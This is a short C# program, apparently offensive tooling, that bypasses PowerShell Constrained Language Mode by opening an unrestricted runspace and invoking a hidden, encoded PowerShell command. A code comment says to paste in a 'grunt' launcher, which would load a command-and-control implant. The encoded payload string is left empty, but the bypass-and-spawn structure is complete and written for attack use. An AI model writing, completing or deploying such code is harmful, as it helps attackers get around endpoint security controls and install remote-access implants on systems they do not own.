using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Management.Automation.Runspaces;
using System.Management.Automation;


namespace PSLangBypass_SpawnShell
{
    class PSLB_SpawnShell
    {
        static void Main(string[] args)
        {
            // Creating the runspace and opening it
            Runspace rs = RunspaceFactory.CreateRunspace();

            // Creating powershell object
            PowerShell ps = PowerShell.Create();

            // Getting the LanguageMode of current session and saving to a file
            // Can just paste the grunt powershell launcher and execute
            String cmd = "powershell -nop -w hidden -e ";

            rs.Open();

            // Initialising the runspace
            ps.Runspace = rs;

            // Running the command above
            ps.AddScript(cmd);
            ps.Invoke();

            // Closing runscape 
            //rs.Close();
        }
    }
}
